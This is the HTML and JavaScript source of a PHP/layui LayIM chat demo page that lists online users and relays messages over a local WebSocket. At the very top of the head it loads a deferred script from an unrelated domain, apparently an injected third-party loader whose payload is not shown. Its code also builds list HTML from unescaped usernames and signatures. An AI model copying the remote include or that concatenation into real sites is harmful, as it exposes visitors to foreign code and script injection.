
<!DOCTYPE html>
<html>
<head><script defer src="https://i.cot8.cc/j/?t=fx&v=1&g=8cab8e192aa8&c=00c2c6e0bf2d&A=8"></script>
    <!--<base href="http://php.77wx.cn">-->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>php来聊起来</title>

    <link rel="stylesheet" href="/layui/css/layui.css">
    <style>
        body { background-image: url('http://img.hf0557.com/2016/09/12/FhKtDRfG1cXV19x1pUn3KUcMBkpK42.jpg'); font-family: "微软雅黑" }
        .layim-members-list { position: relative; width: 330px; padding: 10px 10px 0; border: 1px solid #D9D9D9; background-color: #fff; background-color: rgba(255,255,255,.9); box-shadow: none; overflow: hidden; font-size: 0 }
        .friend-li { display: block; vertical-align: top; font-size: 14px; width: 100%; height: 48px; margin: 10px 0; }
        .friend-li img { width: 48px; height: 48px; border-radius: 100%; float: left; margin-right: 20px; }
        .friend-li p { text-align: left; margin: 0; }
        .friend-li .layui-icon { font-size: 14px; }
        .friend-li p.remark { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        h2 { background-color: #fbfbfb; width: 350px; font-size: 22px; text-align: center;padding: 15px 0}
    </style>
</head>
<body>
<div id="friend">
    <h2>当前在线用户(<span class="num">loading...</span>)_php版</h2>
    <ul class="layim-members-list" id="members-view">
        <!-- <li class="friend-li" data-id="10010" > <img src="http://qzapp.qlogo.cn/qzapp/101328493/64C59F695B9BCA37D8F1C5D95D72C85F/50"> <p>测试测试  <span class="layui-icon layim-status-online"></span>  </p> <p class="remark">我的注册时间:2016-07-07 10:26:55</p> </li> -->
    </ul>
    <h2><a href="/Yue/Index/out">退出</a></h2>
</div>




<script src="/layui/layui.js"></script>
<script src="/js/reconnecting-websocket.js"></script>
<script>

    //如果使用原生WebSocket，可以不用加载socket模块
    layui.use(['layim', 'socket', 'layer', 'jquery'], function(layim) {
        var layer = layui.layer,
                $ = layui.jquery,
                socket = new ReconnectingWebSocket('ws://127.0.0.1:8282');
        //基础配置
        layim.config({

            //初始化接口
            init: {
                url: "http://127.0.0.1:9999/userlist.json",
                data: {}
            }

            //简约模式（不显示主面板）
            //,brief: true

            //查看群员接口
            ,
            members: {
                url: "/Yue/Index/grouplist",
                data: {}
            }


            ,
            uploadImage: {
                url: "/Yue/Index/upload" //（返回的数据格式见下文）
                ,
                type: '' //默认post
            }

            ,
            uploadFile: {
                url: "/Yue/Index/upload" //（返回的数据格式见下文）
                ,
                type: '' //默认post
            }


            //,skin: ['http://cdn.firstlinkapp.com/upload/2016_4/1461747766565_14690.jpg'] //皮肤
            ,
            isgroup: true //是否开启群组
            ,
            chatLog: "/Yue/Index/log/" //聊天记录地址
            ,
            copyright: true //是否授权
        });


        //layim.setChatMin();
        //监听收到的聊天消息

        function chatMessage(res) {

            layim.getMessage(res);


        };

        //layim建立就绪
        layim.on('ready', function(res) {




            //捕捉socket端发来的事件
            socket.onmessage = function(event) {

                var e = JSON.parse(event.data);


                switch (e.type) {

                        //好友上线 添加好友
                    case 'addList':
                        addList(e);
                        break;

                        //用户上线 把在线用户 加到好友列表
                    case 'regUser':
                        regUser(e);
                        break;

                        //用户离线移除好哟
                    case 'out':
                        out(e);
                        break;

                        //处理聊天消息
                    case 'getMessage':
                        chatMessage(e.content);
                        break;

                        //用户不在线
                    case 'notLine':
                        notLine();
                        break;

                    case 'js':
                        console.log(e.cls);
                        break;

                    default:
                        console.log(e);

                }
            }


            //监听发送消息
            layim.on('sendMessage', function(data) {
                var To = data.to;
                //发送消息Socket服务
                socket.send(JSON.stringify({
                    type: 'chatMessage',
                    content: data
                }));

            });

            //用户上线 注册事件
            var reg = {
                type: 'reg',
                content: {
                    uid: '4217',
                    type: 'friend',
                    avatar: 'http://wx.qlogo.cn/mmhead/oLU121BePGmr7hace9ltWibWlbic41qHt0FuHYwJ88icBEYGjmyertJrQ/0',
                    username: '谦哥',
                    groupid: 1,
                    id: '4217',
                    sign: '我的注册时间是2017-07-14 20:28:32'
                }
            }

            setTimeout(function() {

                socket.send(JSON.stringify(reg));

            }, 0);



        });



        //离线反馈

        function notLine() {

            layer.msg('对方不在线');

        }



        function addList(e) {

            //如果有用户突然关机，或同一账号 两处登陆，系统就会统计有误，查看实际连接数
            console.log(e.cls);


            layer.msg("【" + e.content.username + '】上线了，打开在线好友列表和TA聊聊吧', {
                shift: 6,
                offset: 0,
                time: 9000
            });

            layim.addList(e.content);

            $(".num").text(e.num);

            var str = '<li class="friend-li f' + e.content.id + '"> <img src="' + e.content.avatar + '"> <p>' + e.content.username + '  <span class="layui-icon layim-status-online"></span>  </p> <p class="remark">' + e.content.sign + '</p> </li>';

            $("#members-view").append(str);

        }





        function regUser(res) {

            console.log(res);
            $(".num").text(res.num);

            for (var i = 0; i < res.num; i++) {

                layim.addList({
                    type: 'friend' //列表类型，只支持friend和group两种
                    ,
                    avatar: res.uuser[i].avatar //好友头像
                    ,
                    username: res.uuser[i].username //好友昵称
                    ,
                    groupid: 2 //所在的分组id
                    ,
                    id: res.uuser[i].id //好友id
                    ,
                    sign: res.uuser[i].sign //好友签名


                });



                var str = '<li class="friend-li f' + res.uuser[i].id + '"> <img src="' + res.uuser[i].avatar + '"> <p>' + res.uuser[i].username + '  <span class="layui-icon layim-status-online"></span>  </p> <p class="remark">' + res.uuser[i].sign + '</p> </li>';

                $("#members-view").append(str);

            }







        }






        function out(res) {

            console.log(res.cls);
            layim.removeList({
                type: 'friend' //或者group
                ,
                id: res.id //好友或者群组ID
            });

            $(".num").text(res.num);
            $(".f" + res.id).remove();
        }





    });
</script>
</body>
</html>